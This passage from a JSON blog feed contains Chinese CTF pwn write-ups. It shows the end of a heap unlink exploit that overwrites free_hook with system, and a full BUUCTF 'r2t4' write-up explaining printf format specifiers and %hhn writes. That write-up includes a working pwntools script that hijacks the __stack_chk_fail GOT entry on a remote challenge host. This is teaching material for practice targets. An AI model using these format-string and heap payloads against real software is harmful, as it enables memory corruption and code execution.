class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span> <span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p><a href=\"https://blog.csdn.net/qq_41202237/article/details/108481889\">一篇博客弄懂 Unlink</a> <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "PWN",
                "格式化字符串",
                "堆",
                "BUUCTF",
                "unlink"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "url": "http://niyah.cn/CTF/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "title": "格式化字符串",
            "date_published": "2021-01-30T06:10:27.000Z",
            "content_html": "<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">%</span><span class=\"token punctuation\">[</span>parameter<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>flags<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>field width<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>precision<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>length<span class=\"token punctuation\">]</span>type</code></pre>\n<a id=\"more\"></a>\n<h2 id=\"r2t4\"><a class=\"markdownIt-Anchor\" href=\"#r2t4\">#</a> r2t4</h2>\n<p>本题是个格式化字符串漏洞</p>\n<p>这里我们了解一下格式化字符串的格式，其基本格式如下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">%</span><span class=\"token punctuation\">[</span>parameter<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>flags<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>field width<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>precision<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>length<span class=\"token punctuation\">]</span>type</code></pre>\n<p>每一种 pattern 的含义请具体参考维基百科的<a href=\"https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2\">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p>\n<ul>\n<li>parameter\n<ul>\n<li>n$，获取格式化字符串中的指定参数</li>\n</ul>\n</li>\n<li>flag</li>\n<li>field width\n<ul>\n<li>输出的最小宽度</li>\n</ul>\n</li>\n<li>precision\n<ul>\n<li>输出的最大长度</li>\n</ul>\n</li>\n<li>length，输出的长度\n<ul>\n<li>hh，输出一个字节</li>\n<li>h，输出一个双字节</li>\n</ul>\n</li>\n<li>type\n<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li>p， void * 型，输出对应变量的值。printf (&quot;% p&quot;,a) 用地址的格式打印变量 a 的值，printf (&quot;% p&quot;, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>\n<li>%， ' <code>%</code> ' 字面值，不接受任何 flags, width。</li>\n</ul>\n</li>\n</ul>\n<p>首先确定参数偏移</p>\n<p>进入 IDA 进行分析，直接可以看到有一个后门函数可以直接输出 flag，我们只需要调用它就行了</p>\n<p>这题是有 canary 的，但是没有关系，检查 canary 后会执行那个 **__stack_chk_fail** 函数，那么我们利用格式化字符串修改这个函数的地址为后门函数地址就可以输出 flag 了</p>\n<blockquote>\n<p>​\tbackdoor : 0x0000000000400626</p>\n<p>​    __stack_chk_fail : 0x0000000000601038</p>\n</blockquote>\n<p>我们需要将第二个地址的值改为第一个地址，这里有两种方式</p>\n<p>我比较推荐单地址修改的方法，因为一个地址对应在我们看来的两位，而这些地址的存放方式是小端序，所以 0x601038 表示的是最后两位 0x60103A 表示的是倒数第三和倒数第四位</p>\n<p>那么我们按照单字节修改的方式可以将地址划分为三块</p>\n<blockquote>\n<p>​\t60 10 38</p>\n<p>​\t40 06 26</p>\n</blockquote>\n<p>那么我们从最小的开始修改，即 0x06，我们使用 %6c 输出再使用 % x$hhn 修改格式化字符串的第 x 个参数，这个参数即__stack_chk_fail +1</p>\n<p>之后是第二小的，即 0x26，因为我们前面已经输出了 0x06 个字符，所以我们这次只需要输出 0x20 个字符，再使用 % y$hhn 修改格式化字符串的第 y 个参数，即__stack_chk_fail</p>\n<p>从小到大依次修改，最后再计算一下参数偏移就大功告成了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./r2t4'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>word_size<span class=\"token operator\">=</span><span class=\"token string\">'64'</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28241</span><span class=\"token punctuation\">)</span>\n\njump <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__stack_chk_fail'</span><span class=\"token punctuation\">]</span>\n\npayload1 <span class=\"token operator\">=</span> <span class=\"token string\">'%6c%10$hhn%32c%11$hhn%26c%12$hhn'</span>   <span class=\"token comment\">#单地址修改payload</span>\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"%64c%9$hn%1510c%10$hnAAA\"</span>      <span class=\"token comment\">#双地址修改payload</span>\n\npayload3 <span class=\"token operator\">=</span> payload1 <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>jump<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\npayload4 <span class=\"token operator\">=</span> payload2 <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "BUUCTF"
            ]
        }
    ]
}